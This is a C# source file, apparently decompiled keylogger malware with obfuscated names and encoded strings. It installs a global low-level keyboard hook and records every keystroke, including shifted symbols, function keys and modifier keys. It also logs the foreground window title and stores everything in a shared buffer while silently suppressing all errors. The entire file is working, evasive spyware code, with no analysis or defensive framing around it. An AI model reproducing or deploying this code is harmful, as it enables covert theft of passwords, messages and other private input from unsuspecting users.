using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class PWOGVC
{
	private delegate int KeyboardHookDelegate(int Code, int wParam, ref HFRBJRD lParam);

	public struct HFRBJRD
	{
		public int DHKOIIU;

		public int IKKVKSQ;

		public int KXQNGOS;

		public int LWHRWHJ;

		public int BIYTOPH;
	}

	private string output;

	private static IntPtr JRTBUMFP = (IntPtr)0;

	private static string WXQBQYBX = "";

	private static KeyboardHookDelegate OLSECGTX = null;

	public static string LOCOF(IntPtr hWnd)
	{
		string result = default(string);
		try
		{
			if (hWnd.ToInt32() <= 0)
			{
				result = null;
				return result;
			}
			int windowTextLength = GetWindowTextLength(hWnd);
			if (windowTextLength == 0)
			{
				result = null;
				return result;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			GetWindowTextA((int)hWnd, stringBuilder, stringBuilder.Capacity);
			result = stringBuilder.ToString().Trim();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool YXYVKUY()
	{
		bool result = default(bool);
		try
		{
			result = JRTBUMFP != (IntPtr)0;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void LTGKKN()
	{
		try
		{
			OLSECGTX = KYBRDLCK;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			JRTBUMFP = (IntPtr)SetWindowsHookExA(13, OLSECGTX, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void CIOUBCOI()
	{
		try
		{
			if (YXYVKUY() && UnhookWindowsHookEx((int)JRTBUMFP) != 0)
			{
				JRTBUMFP = (IntPtr)0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

	public static int KYBRDLCK(int Code, int WPA, ref HFRBJRD LPA)
	{
		try
		{
			string text = LOCOF(GetForegroundWindow());
			if (Operators.CompareString(text, WXQBQYBX, false) != 0)
			{
				WXQBQYBX = text;
				KVPXNIVH.NPDFHBE = KVPXNIVH.NPDFHBE + Environment.NewLine + LOOTCKC.IPNPIWT("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + text + LOOTCKC.IPNPIWT("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int result = default(int);
		try
		{
			string text2 = "";
			if (WPA == 256 || WPA == 260)
			{
				checked
				{
					switch (LPA.DHKOIIU)
					{
					case 8:
						KVPXNIVH.NPDFHBE = KVPXNIVH.NPDFHBE.Substring(0, KVPXNIVH.NPDFHBE.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? LOOTCKC.IPNPIWT("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : LOOTCKC.IPNPIWT("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = LOOTCKC.IPNPIWT("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = LOOTCKC.IPNPIWT("RyA=", "False");
						break;
					case 35:
						text2 = LOOTCKC.IPNPIWT("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = LOOTCKC.IPNPIWT("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = LOOTCKC.IPNPIWT("U6mVvXIT", "False");
						break;
					case 38:
						text2 = LOOTCKC.IPNPIWT("SJ6ssmce", "False");
						break;
					case 39:
						text2 = LOOTCKC.IPNPIWT("X7WjyX4H", "False");
						break;
					case 40:
						text2 = LOOTCKC.IPNPIWT("O5GXpVor", "False");
						break;
					case 46:
						text2 = LOOTCKC.IPNPIWT("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = LOOTCKC.IPNPIWT("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(LOOTCKC.IPNPIWT("VBM=", "False")) });
							switch (LPA.DHKOIIU)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(LPA.DHKOIIU);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(LPA.DHKOIIU + 32).ToLower() : char.ConvertFromUtf32(LPA.DHKOIIU + 32).ToUpper());
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = LOOTCKC.IPNPIWT("UaedGA==", "False") + Conversions.ToString(LPA.DHKOIIU - 111) + LOOTCKC.IPNPIWT("o4EC", "False");
						break;
					case 162:
					case 163:
						text2 = LOOTCKC.IPNPIWT("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = LOOTCKC.IPNPIWT("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("cBI=", "False") : LOOTCKC.IPNPIWT("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("WSs=", "False") : LOOTCKC.IPNPIWT("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("YhE=", "False") : LOOTCKC.IPNPIWT("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("cAQ=", "False") : LOOTCKC.IPNPIWT("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("ZRA=", "False") : LOOTCKC.IPNPIWT("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("aQ0=", "False") : LOOTCKC.IPNPIWT("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("lBM=", "False") : LOOTCKC.IPNPIWT("vQg=", "False"));
						break;
					default:
						text2 = char.ConvertFromUtf32(LPA.DHKOIIU);
						break;
					case 219:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("mgg=", "False") : LOOTCKC.IPNPIWT("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("czA=", "False") : LOOTCKC.IPNPIWT("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("gSM=", "False") : LOOTCKC.IPNPIWT("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? LOOTCKC.IPNPIWT("bQE=", "False") : LOOTCKC.IPNPIWT("Ths=", "False"));
						break;
					}
					KVPXNIVH.NPDFHBE += text2;
					KVPXNIVH.PTSRTHO = KVPXNIVH.NPDFHBE;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowTextLength(IntPtr hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int hwnd, StringBuilder lpString, int cch);

	public PWOGVC(string output)
	{
		try
		{
			this.output = output;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
